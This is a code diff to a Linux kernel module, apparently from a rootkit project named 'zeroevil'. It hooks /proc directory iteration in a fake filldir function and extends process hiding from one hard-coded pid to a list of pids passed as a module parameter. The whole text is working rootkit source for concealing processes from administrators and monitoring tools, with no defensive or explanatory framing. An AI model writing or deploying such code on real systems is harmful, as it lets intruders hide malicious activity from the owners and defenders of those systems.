@@ -26,13 +26,17 @@
 # include <linux/fs.h>
 # endif // CPP
 
+//#define DEBUG
 # include "zeroevil/zeroevil.h"
 
 
 MODULE_LICENSE("GPL");
 
 # define ROOT_PATH "/proc"
-# define SECRET_PROC 19863
+static unsigned int secret_pids[10];
+static unsigned int secret_pids_c;
+module_param_array_named(pids, secret_pids, uint, &secret_pids_c,S_IRUGO);
+MODULE_PARM_DESC(pids, "some process ids");
 
 int
 (*real_iterate)(struct file *filp, struct dir_context *ctx);
@@ -92,12 +96,15 @@ fake_filldir(struct dir_context *ctx, const char *name, int namlen,
 {
     char *endp;
     long pid;
+    int i;
 
     pid = simple_strtol(name, &endp, 10);
 
-    if (pid == SECRET_PROC) {
-        fm_alert("Hiding pid: %ld", pid);
-        return 0;
+    for (i=0; i<secret_pids_c; i++) {
+        if (pid == secret_pids[i]) {
+            fm_alert("Hiding pid: %ld", pid);
+            return 0;
+        }
     }
 
     /* pr_cont("%s ", name); */
